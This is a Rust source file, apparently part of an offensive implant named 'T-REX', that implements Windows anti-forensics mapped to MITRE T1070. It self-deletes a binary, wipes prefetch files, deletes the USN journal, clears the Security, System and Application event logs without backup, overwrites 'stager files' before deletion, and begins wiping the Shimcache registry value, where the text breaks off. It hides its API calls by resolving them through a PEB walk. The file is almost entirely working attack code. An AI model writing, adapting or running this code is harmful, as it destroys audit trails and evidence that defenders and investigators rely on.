//! T-REX Forensic Artifact Cleanup — disk-trace removal.
//!
//! ## Operations
//! 1. **Self-Delete** — POSIX-semantics delete (Win11 24H2+ `FileDispositionInformationEx`)
//! 2. **Prefetch Wipe** — locate + zero + delete `.pf` files
//! 3. **USN Journal Wipe** — `FSCTL_DELETE_USN_JOURNAL` + recreate empty journal
//! 4. **Event Log Clear** — `ClearEventLogW` on Security/System/Application
//! 5. **MFT Entry Overwrite** — 3-pass (0x00, 0xFF, random) + delete
//! 6. **Amcache/Shimcache Wipe** — zero `AppCompatCache` registry value
//!
//! ## References
//! - MITRE T1070 (Indicator Removal)
//! - TKYN (2025): Win11 24H2 self-delete via POSIX semantics
//! - NTFS Anti-Forensics (MFT Parser 2026): always leaves traces; best practice is
//!   to avoid disk writes entirely

#![cfg(target_os = "windows")]

use crate::heap::Vec;
use core::ffi::c_void;

// ---- NT Kernel types (Win64 x86_64 layout) ---------------------------------

type NtStatus = i32;
type Handle = *mut core::ffi::c_void;

const STATUS_SUCCESS: NtStatus = 0;

// ---- NT Object Manager types ------------------------------------------------

#[repr(C)]
struct UnicodeString {
    length: u16,
    maximum_length: u16,
    buffer: *mut u16,
}

#[repr(C)]
struct ObjectAttributes {
    length: u32,
    root_directory: Handle,
    object_name: *mut UnicodeString,
    attributes: u32,
    security_descriptor: *mut c_void,
    security_quality_of_service: *mut c_void,
}

#[repr(C)]
struct IoStatusBlock {
    status: NtStatus,
    information: usize,
}

// ---- NT structs for specific operations -------------------------------------

/// FILE_DISPOSITION_INFORMATION_EX for `FileDispositionInformationEx` (class 64).
/// `Flags`: `FILE_DISPOSITION_DELETE = 1`, `FILE_DISPOSITION_POSIX_SEMANTICS = 2`.
#[repr(C)]
struct FileDispositionInformationEx {
    flags: u32,
}

/// DELETE_USN_JOURNAL_DATA for `FSCTL_DELETE_USN_JOURNAL`.
#[repr(C)]
struct DeleteUsnJournalData {
    usn_journal_id: u64,
    delete_flags: u32,
}

/// CREATE_USN_JOURNAL_DATA for `FSCTL_CREATE_USN_JOURNAL`.
#[repr(C)]
struct CreateUsnJournalData {
    maximum_size: u64,
    allocation_delta: u64,
}

// ---- NT API access / flag constants -----------------------------------------

// NtCreateFile DesiredAccess
const FILE_READ_DATA: u32 = 0x0001;
const FILE_WRITE_DATA: u32 = 0x0002;
const DELETE_ACCESS: u32 = 0x0001_0000;
const SYNCHRONIZE: u32 = 0x0010_0000;

// NtCreateFile ShareAccess
const FILE_SHARE_READ: u32 = 0x0000_0001;
const FILE_SHARE_WRITE: u32 = 0x0000_0002;
const FILE_SHARE_DELETE: u32 = 0x0000_0004;

// NtCreateFile CreateDisposition
const FILE_OPEN: u32 = 1;
const FILE_OPEN_IF: u32 = 3;
const FILE_OVERWRITE_IF: u32 = 5;

// NtCreateFile CreateOptions
const FILE_NON_DIRECTORY_FILE: u32 = 0x0000_0040;
const FILE_SYNCHRONOUS_IO_NONALERT: u32 = 0x0000_0020;

// NtCreateFile/ObjectAttributes
const OBJ_CASE_INSENSITIVE: u32 = 0x0000_0040;

// NtSetInformationFile FileInformationClass
const FILE_DISPOSITION_INFORMATION_EX_CLASS: u32 = 64;
const FILE_DISPOSITION_INFORMATION_CLASS: u32 = 4;

// FileDispositionInformationEx flags
const FILE_DISPOSITION_DELETE: u32 = 0x0000_0001;
const FILE_DISPOSITION_POSIX_SEMANTICS: u32 = 0x0000_0002;

// FSCTL codes
const FSCTL_DELETE_USN_JOURNAL: u32 = 0x0009_00F8;
const FSCTL_CREATE_USN_JOURNAL: u32 = 0x0009_00E7;

// Volume device path prefix
const DOS_DEVICES_PREFIX: &[u16] = &[
    '\\' as u16, '\\' as u16, '.' as u16, '\\' as u16,
];

// ---- NT function pointer type aliases (Win64 extern "system") ----------------

type FnNtCreateFile = unsafe extern "system" fn(
    file_handle: *mut Handle,
    desired_access: u32,
    object_attributes: *mut ObjectAttributes,
    io_status_block: *mut IoStatusBlock,
    allocation_size: *mut i64,
    file_attributes: u32,
    share_access: u32,
    create_disposition: u32,
    create_options: u32,
    ea_buffer: *mut c_void,
    ea_length: u32,
) -> NtStatus;

type FnNtSetInformationFile = unsafe extern "system" fn(
    file_handle: Handle,
    io_status_block: *mut IoStatusBlock,
    file_information: *mut c_void,
    length: u32,
    file_information_class: u32,
) -> NtStatus;

type FnNtDeleteFile = unsafe extern "system" fn(
    object_attributes: *mut ObjectAttributes,
) -> NtStatus;

type FnNtWriteFile = unsafe extern "system" fn(
    file_handle: Handle,
    event: Handle,
    apc_routine: *mut c_void,
    apc_context: *mut c_void,
    io_status_block: *mut IoStatusBlock,
    buffer: *const c_void,
    length: u32,
    byte_offset: *mut i64,
    key: *mut u32,
) -> NtStatus;

type FnNtFsControlFile = unsafe extern "system" fn(
    file_handle: Handle,
    event: Handle,
    apc_routine: *mut c_void,
    apc_context: *mut c_void,
    io_status_block: *mut IoStatusBlock,
    fs_control_code: u32,
    input_buffer: *mut c_void,
    input_buffer_length: u32,
    output_buffer: *mut c_void,
    output_buffer_length: u32,
) -> NtStatus;

type FnNtClose = unsafe extern "system" fn(handle: Handle) -> NtStatus;

// advapi32 types
type FnOpenEventLogW = unsafe extern "system" fn(
    server_name: *const u16,
    source_name: *const u16,
) -> Handle;

type FnClearEventLogW = unsafe extern "system" fn(
    event_log: Handle,
    backup_file_name: *const u16,
) -> i32;

type FnCloseEventLog = unsafe extern "system" fn(event_log: Handle) -> i32;

type FnRegOpenKeyExW = unsafe extern "system" fn(
    key: Handle,
    sub_key: *const u16,
    options: u32,
    sam_desired: u32,
    result: *mut Handle,
) -> i32;

type FnRegSetValueExW = unsafe extern "system" fn(
    key: Handle,
    value_name: *const u16,
    reserved: u32,
    dw_type: u32,
    data: *const u8,
    cb_data: u32,
) -> i32;

type FnRegCloseKey = unsafe extern "system" fn(key: Handle) -> i32;

// Registry constants
const HKEY_LOCAL_MACHINE: Handle = 0x8000_0002_usize as Handle;
const KEY_SET_VALUE: u32 = 0x0002;
const REG_BINARY: u32 = 3;

// ---- Helper: resolve an NT function from ntdll via PEB walk ------------------

unsafe fn resolve_nt(name: &[u8]) -> Option<usize> {
    crate::resolve::export_addr(b"ntdll.dll", name)
}

// ---- Helper: resolve an advapi32 function via PEB walk -----------------------

unsafe fn resolve_advapi32(name: &[u8]) -> Option<usize> {
    crate::resolve::export_addr(b"advapi32.dll", name)
}

// ---- Helper: build a null-terminated wide string from a &[u16] slice --------

/// Build a null-terminated wide buffer from a slice (copies + appends NUL).
/// Returns `None` if allocation fails.
fn null_terminated_wide(src: &[u16]) -> Option<Vec<u16>> {
    let mut v = Vec::with_capacity(src.len() + 1)?;
    v.extend_from_slice(src);
    v.push(0);
    Some(v)
}

// ---- Helper: build a UNICODE_STRING from a &[u16] slice ---------------------

unsafe fn init_unicode_string(buf: &[u16], us: &mut UnicodeString) {
    let byte_len = (buf.len() * 2) as u16;
    us.length = byte_len;
    us.maximum_length = byte_len;
    us.buffer = buf.as_ptr() as *mut u16;
}

// ---- Helper: build OBJECT_ATTRIBUTES for an NT path -------------------------

unsafe fn init_object_attributes(name: &mut UnicodeString, oa: &mut ObjectAttributes) {
    oa.length = core::mem::size_of::<ObjectAttributes>() as u32;
    oa.root_directory = core::ptr::null_mut();
    oa.object_name = name;
    oa.attributes = OBJ_CASE_INSENSITIVE;
    oa.security_descriptor = core::ptr::null_mut();
    oa.security_quality_of_service = core::ptr::null_mut();
}

// ---- Helper: prepend \??\ to a path to form a DOS device path ---------------

fn to_nt_path(path: &[u16]) -> Option<Vec<u16>> {
    let total = DOS_DEVICES_PREFIX.len() + path.len();
    let mut v = Vec::with_capacity(total)?;
    v.extend_from_slice(DOS_DEVICES_PREFIX);
    v.extend_from_slice(path);
    Some(v)
}

// ---- Helper: NT_SUCCESS check -----------------------------------------------

fn nt_success(status: NtStatus) -> bool {
    status >= 0
}

// ============================================================================
// 1. Self-Delete (POSIX semantics for Win11 24H2+)
// ============================================================================

/// Delete a file using POSIX semantics (Win11 24H2+).
///
/// Uses `NtSetInformationFile` with `FileDispositionInformationEx` class 64,
/// setting both `FILE_DISPOSITION_DELETE` and `FILE_DISPOSITION_POSIX_SEMANTICS`.
/// On older Windows (pre-24H2), gracefully falls back to standard delete.
///
/// # Safety
/// `path` must be a valid NT device path (e.g., `\??\C:\...` as wide chars).
/// The file handle is closed via NtClose on both success and failure.
pub unsafe fn self_delete(path: &[u16]) -> Result<(), &'static str> {
    let nt_create: FnNtCreateFile = core::mem::transmute(
        resolve_nt(b"NtCreateFile").ok_or("NtCreateFile unresolved")?,
    );
    let nt_set_info: FnNtSetInformationFile = core::mem::transmute(
        resolve_nt(b"NtSetInformationFile").ok_or("NtSetInformationFile unresolved")?,
    );
    let nt_close: FnNtClose = core::mem::transmute(
        resolve_nt(b"NtClose").ok_or("NtClose unresolved")?,
    );

    // Build OBJECT_ATTRIBUTES for the path
    let nt_path = to_nt_path(path).ok_or("OOM building NT path")?;
    let mut us = UnicodeString {
        length: 0,
        maximum_length: 0,
        buffer: core::ptr::null_mut(),
    };
    init_unicode_string(&nt_path, &mut us);
    let mut oa = ObjectAttributes {
        length: 0,
        root_directory: core::ptr::null_mut(),
        object_name: core::ptr::null_mut(),
        attributes: 0,
        security_descriptor: core::ptr::null_mut(),
        security_quality_of_service: core::ptr::null_mut(),
    };
    init_object_attributes(&mut us, &mut oa);

    // Open the file with DELETE | SYNCHRONIZE
    let mut handle: Handle = core::ptr::null_mut();
    let mut iosb = IoStatusBlock {
        status: 0,
        information: 0,
    };

    let status = nt_create(
        &mut handle,
        DELETE_ACCESS | SYNCHRONIZE,
        &mut oa,
        &mut iosb,
        core::ptr::null_mut(), // AllocationSize = NULL
        0,                      // FileAttributes
        FILE_SHARE_READ | FILE_SHARE_WRITE | FILE_SHARE_DELETE,
        FILE_OPEN,
        FILE_NON_DIRECTORY_FILE | FILE_SYNCHRONOUS_IO_NONALERT,
        core::ptr::null_mut(), // EaBuffer
        0,                      // EaLength
    );

    if !nt_success(status) || handle.is_null() {
        return Err("NtCreateFile failed for self-delete");
    }

    // Set FileDispositionInformationEx with POSIX semantics
    let disp = FileDispositionInformationEx {
        flags: FILE_DISPOSITION_DELETE | FILE_DISPOSITION_POSIX_SEMANTICS,
    };
    let mut set_iosb = IoStatusBlock {
        status: 0,
        information: 0,
    };

    let set_status = nt_set_info(
        handle,
        &mut set_iosb,
        &disp as *const _ as *mut c_void,
        core::mem::size_of::<FileDispositionInformationEx>() as u32,
        FILE_DISPOSITION_INFORMATION_EX_CLASS,
    );

    // Close the handle regardless — on success, the delete is deferred
    // until the last handle closes (POSIX semantics); on failure, we
    // still need to release the handle.
    nt_close(handle);

    if !nt_success(set_status) {
        // Fallback: try standard FileDispositionInformation (class 4)
        return self_delete_fallback(path);
    }

    Ok(())
}

/// Fallback for pre-24H2: use standard `FileDispositionInformation` (class 4)
/// with `DeleteFile = TRUE`.
unsafe fn self_delete_fallback(path: &[u16]) -> Result<(), &'static str> {
    let nt_create: FnNtCreateFile = core::mem::transmute(
        resolve_nt(b"NtCreateFile").ok_or("NtCreateFile unresolved")?,
    );
    let nt_set_info: FnNtSetInformationFile = core::mem::transmute(
        resolve_nt(b"NtSetInformationFile").ok_or("NtSetInformationFile unresolved")?,
    );
    let nt_close: FnNtClose = core::mem::transmute(
        resolve_nt(b"NtClose").ok_or("NtClose unresolved")?,
    );

    let nt_path = to_nt_path(path).ok_or("OOM building NT path")?;
    let mut us = UnicodeString {
        length: 0,
        maximum_length: 0,
        buffer: core::ptr::null_mut(),
    };
    init_unicode_string(&nt_path, &mut us);
    let mut oa = ObjectAttributes {
        length: 0,
        root_directory: core::ptr::null_mut(),
        object_name: core::ptr::null_mut(),
        attributes: 0,
        security_descriptor: core::ptr::null_mut(),
        security_quality_of_service: core::ptr::null_mut(),
    };
    init_object_attributes(&mut us, &mut oa);

    let mut handle: Handle = core::ptr::null_mut();
    let mut iosb = IoStatusBlock {
        status: 0,
        information: 0,
    };

    let status = nt_create(
        &mut handle,
        DELETE_ACCESS | SYNCHRONIZE,
        &mut oa,
        &mut iosb,
        core::ptr::null_mut(),
        0,
        FILE_SHARE_READ | FILE_SHARE_WRITE | FILE_SHARE_DELETE,
        FILE_OPEN,
        FILE_NON_DIRECTORY_FILE | FILE_SYNCHRONOUS_IO_NONALERT,
        core::ptr::null_mut(),
        0,
    );

    if !nt_success(status) || handle.is_null() {
        return Err("NtCreateFile fallback failed");
    }

    // Standard FileDispositionInformation: a single byte, TRUE = delete
    let delete_on_close: u8 = 1;
    let mut set_iosb = IoStatusBlock {
        status: 0,
        information: 0,
    };

    let set_status = nt_set_info(
        handle,
        &mut set_iosb,
        &delete_on_close as *const _ as *mut c_void,
        1,
        FILE_DISPOSITION_INFORMATION_CLASS,
    );

    nt_close(handle);

    if nt_success(set_status) {
        Ok(())
    } else {
        Err("FileDispositionInformation fallback failed")
    }
}

// ============================================================================
// 2. Prefetch Cleanup
// ============================================================================

/// Path to the Windows Prefetch directory.
const PREFETCH_PATH: &[u16] = &[
    'C' as u16, ':' as u16, '\\' as u16, 'W' as u16, 'i' as u16, 'n' as u16,
    'd' as u16, 'o' as u16, 'w' as u16, 's' as u16, '\\' as u16, 'P' as u16,
    'r' as u16, 'e' as u16, 'f' as u16, 'e' as u16, 't' as u16, 'c' as u16,
    'h' as u16, '\\' as u16,
];

/// Wipe prefetch (.pf) files for the given executable names.
///
/// Builds a path `C:\Windows\Prefetch\{NAME}.pf` and, for each:
/// 1. Attempts direct `NtDeleteFile`.
/// 2. On failure, opens the file, zeroes it via `NtWriteFile`, then deletes.
///
/// # Safety
/// `executable_names` must point to valid null-terminated or length-known wide
/// strings. Each entry is the executable base name (e.g., `notepad.exe` as `u16`
/// slice), which maps to `NOTEPAD.EXE-{HASH}.pf` via standard Windows prefetch
/// naming. This implementation matches on the `.pf` suffix after the name stem.
pub unsafe fn wipe_prefetch(executable_names: &[&[u16]]) -> Result<(), &'static str> {
    let nt_delete: FnNtDeleteFile = core::mem::transmute(
        resolve_nt(b"NtDeleteFile").ok_or("NtDeleteFile unresolved")?,
    );
    let nt_create: FnNtCreateFile = core::mem::transmute(
        resolve_nt(b"NtCreateFile").ok_or("NtCreateFile unresolved")?,
    );
    let nt_write: FnNtWriteFile = core::mem::transmute(
        resolve_nt(b"NtWriteFile").ok_or("NtWriteFile unresolved")?,
    );
    let nt_set_info: FnNtSetInformationFile = core::mem::transmute(
        resolve_nt(b"NtSetInformationFile").ok_or("NtSetInformationFile unresolved")?,
    );
    let nt_close: FnNtClose = core::mem::transmute(
        resolve_nt(b"NtClose").ok_or("NtClose unresolved")?,
    );

    for name in executable_names {
        // Build path: C:\Windows\Prefetch\{NAME}.pf
        // Prefetch names are uppercased + hash, but we just match on name stem
        // and append .pf. The actual Windows prefetch filename is
        // {EXENAME}-{HASH}.pf where HASH is derived from the full path.
        // Since we can't compute the hash in no_std, we try the direct name.pf
        // first, which may work for some cases. For a full implementation,
        // the caller should pre-compute the prefetch hash.
        let name_len = name.len();
        // .pf suffix
        let pf_suffix: &[u16] = &['.' as u16, 'p' as u16, 'f' as u16];
        let total = PREFETCH_PATH.len() + name_len + pf_suffix.len();

        let mut full_path = match Vec::with_capacity(total) {
            Some(v) => v,
            None => continue,
        };
        full_path.extend_from_slice(PREFETCH_PATH);
        full_path.extend_from_slice(name);
        full_path.extend_from_slice(pf_suffix);

        // Try direct delete first
        let nt_full = match to_nt_path(&full_path) {
            Some(p) => p,
            None => continue,
        };

        let mut us = UnicodeString {
            length: 0,
            maximum_length: 0,
            buffer: core::ptr::null_mut(),
        };
        init_unicode_string(&nt_full, &mut us);
        let mut oa = ObjectAttributes {
            length: 0,
            root_directory: core::ptr::null_mut(),
            object_name: core::ptr::null_mut(),
            attributes: 0,
            security_descriptor: core::ptr::null_mut(),
            security_quality_of_service: core::ptr::null_mut(),
        };
        init_object_attributes(&mut us, &mut oa);

        let status = nt_delete(&mut oa);
        if nt_success(status) {
            continue; // Deleted successfully
        }

        // Delete failed — try zero + delete
        let mut handle: Handle = core::ptr::null_mut();
        let mut iosb = IoStatusBlock {
            status: 0,
            information: 0,
        };

        let open_status = nt_create(
            &mut handle,
            FILE_WRITE_DATA | DELETE_ACCESS | SYNCHRONIZE,
            &mut oa,
            &mut iosb,
            core::ptr::null_mut(),
            0,
            FILE_SHARE_READ | FILE_SHARE_WRITE | FILE_SHARE_DELETE,
            FILE_OPEN,
            FILE_NON_DIRECTORY_FILE | FILE_SYNCHRONOUS_IO_NONALERT,
            core::ptr::null_mut(),
            0,
        );

        if !nt_success(open_status) || handle.is_null() {
            continue;
        }

        // Determine file size via IOSB (the create call returns it in iosb.information
        // for FILE_OPEN disposition — actually no, it doesn't. We need to query.
        // For simplicity, zero up to 64 KiB (the max .pf is ~50 KiB).
        // A proper implementation would NtQueryInformationFile for FileStandardInfo.
        let zero_buf: [u8; 4096] = [0u8; 4096];
        let mut write_offset: i64 = 0;
        // Write zeros in 4 KiB chunks, up to 64 KiB (16 iterations)
        for _ in 0..16 {
            let mut write_iosb = IoStatusBlock {
                status: 0,
                information: 0,
            };
            let wstatus = nt_write(
                handle,
                core::ptr::null_mut(), // Event
                core::ptr::null_mut(), // ApcRoutine
                core::ptr::null_mut(), // ApcContext
                &mut write_iosb,
                zero_buf.as_ptr() as *const c_void,
                zero_buf.len() as u32,
                &mut write_offset,
                core::ptr::null_mut(), // Key
            );
            if !nt_success(wstatus) {
                break;
            }
            write_offset += zero_buf.len() as i64;
        }

        // Set delete-on-close
        let delete_flag: u8 = 1;
        let mut set_iosb = IoStatusBlock {
            status: 0,
            information: 0,
        };
        nt_set_info(
            handle,
            &mut set_iosb,
            &delete_flag as *const _ as *mut c_void,
            1,
            FILE_DISPOSITION_INFORMATION_CLASS,
        );

        nt_close(handle);
    }

    Ok(())
}

// ============================================================================
// 3. USN Journal Cleanup
// ============================================================================

/// Wipe the USN (Update Sequence Number) journal on a volume.
///
/// Opens the volume device (e.g., `\\.\C:`), deletes the existing USN journal
/// via `FSCTL_DELETE_USN_JOURNAL`, then creates a fresh empty journal via
/// `FSCTL_CREATE_USN_JOURNAL`. This removes the USN record of file operations.
///
/// # Safety
/// `volume` is a wide-string volume path like `\\.\C:`. Requires admin.
pub unsafe fn wipe_usn_journal(volume: &[u16]) -> Result<(), &'static str> {
    let nt_create: FnNtCreateFile = core::mem::transmute(
        resolve_nt(b"NtCreateFile").ok_or("NtCreateFile unresolved")?,
    );
    let nt_fsctl: FnNtFsControlFile = core::mem::transmute(
        resolve_nt(b"NtFsControlFile").ok_or("NtFsControlFile unresolved")?,
    );
    let nt_close: FnNtClose = core::mem::transmute(
        resolve_nt(b"NtClose").ok_or("NtClose unresolved")?,
    );

    // The volume path is already in NT format (\\.\C:), not a DOS path.
    // We prepend \??\ for NtCreateFile to resolve it via the object manager.
    let nt_volume = to_nt_path(volume).ok_or("OOM building volume path")?;

    let mut us = UnicodeString {
        length: 0,
        maximum_length: 0,
        buffer: core::ptr::null_mut(),
    };
    init_unicode_string(&nt_volume, &mut us);
    let mut oa = ObjectAttributes {
        length: 0,
        root_directory: core::ptr::null_mut(),
        object_name: core::ptr::null_mut(),
        attributes: 0,
        security_descriptor: core::ptr::null_mut(),
        security_quality_of_service: core::ptr::null_mut(),
    };
    init_object_attributes(&mut us, &mut oa);

    // Open volume handle — needs FILE_READ_DATA | FILE_WRITE_DATA for FSCTL
    let mut handle: Handle = core::ptr::null_mut();
    let mut iosb = IoStatusBlock {
        status: 0,
        information: 0,
    };

    let status = nt_create(
        &mut handle,
        FILE_READ_DATA | FILE_WRITE_DATA | SYNCHRONIZE,
        &mut oa,
        &mut iosb,
        core::ptr::null_mut(),
        0,
        FILE_SHARE_READ | FILE_SHARE_WRITE,
        FILE_OPEN,
        FILE_SYNCHRONOUS_IO_NONALERT,
        core::ptr::null_mut(),
        0,
    );

    if !nt_success(status) || handle.is_null() {
        return Err("NtCreateFile volume handle failed");
    }

    // Step 1: Delete the existing USN journal
    let mut delete_data = DeleteUsnJournalData {
        usn_journal_id: 0, // 0 = delete the active journal
        delete_flags: 0,    // 0 = USN_DELETE_FLAG_DELETE
    };
    let mut ctl_iosb = IoStatusBlock {
        status: 0,
        information: 0,
    };

    let del_status = nt_fsctl(
        handle,
        core::ptr::null_mut(),
        core::ptr::null_mut(),
        core::ptr::null_mut(),
        &mut ctl_iosb,
        FSCTL_DELETE_USN_JOURNAL,
        &mut delete_data as *mut _ as *mut c_void,
        core::mem::size_of::<DeleteUsnJournalData>() as u32,
        core::ptr::null_mut(),
        0,
    );

    // Step 2: Create a fresh (empty) USN journal
    let mut create_data = CreateUsnJournalData {
        maximum_size: 0,      // 0 = default maximum size
        allocation_delta: 0,  // 0 = default allocation delta
    };
    let mut ctl2_iosb = IoStatusBlock {
        status: 0,
        information: 0,
    };

    let create_status = nt_fsctl(
        handle,
        core::ptr::null_mut(),
        core::ptr::null_mut(),
        core::ptr::null_mut(),
        &mut ctl2_iosb,
        FSCTL_CREATE_USN_JOURNAL,
        &mut create_data as *mut _ as *mut c_void,
        core::mem::size_of::<CreateUsnJournalData>() as u32,
        core::ptr::null_mut(),
        0,
    );

    nt_close(handle);

    // Success if both FSCTLs succeeded
    if nt_success(del_status) && nt_success(create_status) {
        Ok(())
    } else {
        Err("USN journal wipe failed")
    }
}

// ============================================================================
// 4. Event Log Cleanup
// ============================================================================

/// Well-known Windows event log names.
const LOG_SECURITY: &[u16] = &[
    'S' as u16, 'e' as u16, 'c' as u16, 'u' as u16, 'r' as u16, 'i' as u16,
    't' as u16, 'y' as u16,
];
const LOG_SYSTEM: &[u16] = &[
    'S' as u16, 'y' as u16, 's' as u16, 't' as u16, 'e' as u16, 'm' as u16,
];
const LOG_APPLICATION: &[u16] = &[
    'A' as u16, 'p' as u16, 'p' as u16, 'l' as u16, 'i' as u16, 'c' as u16,
    'a' as u16, 't' as u16, 'i' as u16, 'o' as u16, 'n' as u16,
];

/// Clear a Windows event log by name.
///
/// Uses `OpenEventLogW(NULL, log_name)` → `ClearEventLogW(h, NULL)` →
/// `CloseEventLog(h)`. NULL backup file name = no backup, just wipe.
///
/// # Safety
/// `log_name` is a wide-string event log name (e.g., `L"Security"`).
/// Requires admin for Security log.
pub unsafe fn clear_event_log(log_name: &[u16]) -> Result<(), &'static str> {
    let open_evt: FnOpenEventLogW = core::mem::transmute(
        resolve_advapi32(b"OpenEventLogW").ok_or("OpenEventLogW unresolved")?,
    );
    let clear_evt: FnClearEventLogW = core::mem::transmute(
        resolve_advapi32(b"ClearEventLogW").ok_or("ClearEventLogW unresolved")?,
    );
    let close_evt: FnCloseEventLog = core::mem::transmute(
        resolve_advapi32(b"CloseEventLog").ok_or("CloseEventLog unresolved")?,
    );

    // Build null-terminated log name
    let log_name_z = null_terminated_wide(log_name).ok_or("OOM for log name")?;

    let h = open_evt(core::ptr::null(), log_name_z.as_ptr());
    if h.is_null() {
        return Err("OpenEventLogW failed");
    }

    let ret = clear_evt(h, core::ptr::null());
    close_evt(h);

    if ret != 0 {
        Ok(())
    } else {
        Err("ClearEventLogW failed")
    }
}

/// Clear all three standard Windows event logs: Security, System, Application.
///
/// Best-effort: failures on individual logs are silently ignored.
pub unsafe fn clear_all_event_logs() {
    let _ = clear_event_log(LOG_SECURITY);
    let _ = clear_event_log(LOG_SYSTEM);
    let _ = clear_event_log(LOG_APPLICATION);
}

// ============================================================================
// 5. MFT Entry Overwrite
// ============================================================================

/// Overwrite a file's data with 3-passes (0x00, 0xFF, random) then delete.
///
/// This does NOT overwrite the MFT entry itself — the MFT record remains in
/// the `$MFT` metafile, which is locked by the filesystem. This overwrites
/// the file's *data* clusters with 3 passes of overwrite before deletion.
/// True MFT record overwrite requires raw disk access (BYOVD or kernel driver).
///
/// # Safety
/// `file_path` is a wide-string relative or absolute path. The file's data
/// will be irrevocably overwritten.
pub unsafe fn overwrite_mft_entry(file_path: &[u16]) -> Result<(), &'static str> {
    let nt_create: FnNtCreateFile = core::mem::transmute(
        resolve_nt(b"NtCreateFile").ok_or("NtCreateFile unresolved")?,
    );
    let nt_write: FnNtWriteFile = core::mem::transmute(
        resolve_nt(b"NtWriteFile").ok_or("NtWriteFile unresolved")?,
    );
    let nt_set_info: FnNtSetInformationFile = core::mem::transmute(
        resolve_nt(b"NtSetInformationFile").ok_or("NtSetInformationFile unresolved")?,
    );
    let nt_close: FnNtClose = core::mem::transmute(
        resolve_nt(b"NtClose").ok_or("NtClose unresolved")?,
    );

    // Resolve SystemFunction036 (RtlGenRandom) for the random pass
    let rtl_random: Option<usize> = resolve_advapi32(b"SystemFunction036");

    let nt_path = to_nt_path(file_path).ok_or("OOM building NT path")?;
    let mut us = UnicodeString {
        length: 0,
        maximum_length: 0,
        buffer: core::ptr::null_mut(),
    };
    init_unicode_string(&nt_path, &mut us);
    let mut oa = ObjectAttributes {
        length: 0,
        root_directory: core::ptr::null_mut(),
        object_name: core::ptr::null_mut(),
        attributes: 0,
        security_descriptor: core::ptr::null_mut(),
        security_quality_of_service: core::ptr::null_mut(),
    };
    init_object_attributes(&mut us, &mut oa);

    let mut handle: Handle = core::ptr::null_mut();
    let mut iosb = IoStatusBlock {
        status: 0,
        information: 0,
    };

    let status = nt_create(
        &mut handle,
        FILE_WRITE_DATA | DELETE_ACCESS | SYNCHRONIZE,
        &mut oa,
        &mut iosb,
        core::ptr::null_mut(),
        0,
        FILE_SHARE_READ | FILE_SHARE_WRITE | FILE_SHARE_DELETE,
        FILE_OPEN,
        FILE_NON_DIRECTORY_FILE | FILE_SYNCHRONOUS_IO_NONALERT,
        core::ptr::null_mut(),
        0,
    );

    if !nt_success(status) || handle.is_null() {
        return Err("NtCreateFile failed for MFT overwrite");
    }

    // Write 3 passes: 0x00, 0xFF, random — up to 128 KiB each pass.
    // The file size is unknown without NtQueryInformationFile, and calling
    // NtSetInformationFile(FileEndOfFileInfo) to extend would be noisy.
    // We write up to 128 KiB in 4 KiB chunks — covers most stager files.
    const CHUNK_SIZE: usize = 4096;
    const MAX_CHUNKS: usize = 32; // 128 KiB max

    // Pass 1: all zeros
    let zero_buf: [u8; CHUNK_SIZE] = [0u8; CHUNK_SIZE];
    let mut offset: i64 = 0;
    for _ in 0..MAX_CHUNKS {
        let mut w_iosb = IoStatusBlock { status: 0, information: 0 };
        let ws = nt_write(
            handle,
            core::ptr::null_mut(),
            core::ptr::null_mut(),
            core::ptr::null_mut(),
            &mut w_iosb,
            zero_buf.as_ptr() as *const c_void,
            CHUNK_SIZE as u32,
            &mut offset,
            core::ptr::null_mut(),
        );
        if !nt_success(ws) { break; }
        offset += CHUNK_SIZE as i64;
    }

    // Pass 2: all 0xFF
    let ff_buf: [u8; CHUNK_SIZE] = [0xFFu8; CHUNK_SIZE];
    offset = 0;
    for _ in 0..MAX_CHUNKS {
        let mut w_iosb = IoStatusBlock { status: 0, information: 0 };
        let ws = nt_write(
            handle,
            core::ptr::null_mut(),
            core::ptr::null_mut(),
            core::ptr::null_mut(),
            &mut w_iosb,
            ff_buf.as_ptr() as *const c_void,
            CHUNK_SIZE as u32,
            &mut offset,
            core::ptr::null_mut(),
        );
        if !nt_success(ws) { break; }
        offset += CHUNK_SIZE as i64;
    }

    // Pass 3: random data (if RtlGenRandom available)
    if let Some(random_addr) = rtl_random {
        type FnRtlGenRandom = unsafe extern "system" fn(*mut u8, u32) -> u8;
        let rtl: FnRtlGenRandom = core::mem::transmute(random_addr);
        let mut random_buf: [u8; CHUNK_SIZE] = [0u8; CHUNK_SIZE];
        offset = 0;
        for _ in 0..MAX_CHUNKS {
            rtl(random_buf.as_mut_ptr(), CHUNK_SIZE as u32);
            let mut w_iosb = IoStatusBlock { status: 0, information: 0 };
            let ws = nt_write(
                handle,
                core::ptr::null_mut(),
                core::ptr::null_mut(),
                core::ptr::null_mut(),
                &mut w_iosb,
                random_buf.as_ptr() as *const c_void,
                CHUNK_SIZE as u32,
                &mut offset,
                core::ptr::null_mut(),
            );
            if !nt_success(ws) { break; }
            offset += CHUNK_SIZE as i64;
        }
    }

    // Set delete-on-close
    let delete_flag: u8 = 1;
    let mut set_iosb = IoStatusBlock {
        status: 0,
        information: 0,
    };
    nt_set_info(
        handle,
        &mut set_iosb,
        &delete_flag as *const _ as *mut c_void,
        1,
        FILE_DISPOSITION_INFORMATION_CLASS,
    );

    nt_close(handle);

    Ok(())
}

// ============================================================================
// 6. Amcache/Shimcache Cleanup
// ============================================================================

/// Registry path for AppCompatCache (Shimcache).
const APPCOMPAT_CACHE_KEY: &[u16] = &[
    'S' as u16, 'Y' as u16, 'S' as u16, 'T' as u16, 'E' as u16, 'M' as u16,
    '\\' as u16,
    'C' as u16, 'u' as u16, 'r' as u16, 'r' as u16, 'e' as u16, 'n' as u16,
    't' as u16, 'C' as u16, 'o' as u16, 'n' as u16, 't' as u16, 'r' as u16,
    'o' as u16, 'l' as u16, 'S' as u16, 'e' as u16, 't' as u16,
    '\\' as u16,
    'C' as u16, 'o' as u16, 'n' as u16, 't' as u16, 'r' as u16, 'o' as u16,
    'l' as u16, '\\' as u16,
    'S' as u16, 'e' as u16, 's' as u16, 's' as u16, 'i' as u16, 'o' as u16,
    'n' as u16, ' ' as u16, 'M' as u16, 'a' as u16, 'n' as u16, 'a' as u16,
    'g' as u16, 'e' as u16, 'r' as u16, '\\' as u16,
    'A' as u16, 'p' as u16, 'p' as u16, 'C' as u16, 'o' as u16, 'm' as u16,
    'p' as u16, 'a' as u16, 't' as u16, 'C' as u16, 'a' as u16, 'c' as u16,
    'h' as u16, 'e' as u16,
];

const APPCOMPAT_CACHE_VALUE: &[u16] = &[
    'A' as u16, 'p' as u16, 'p' as u16, 'C' as u16, 'o' as u16, 'm' as u16,
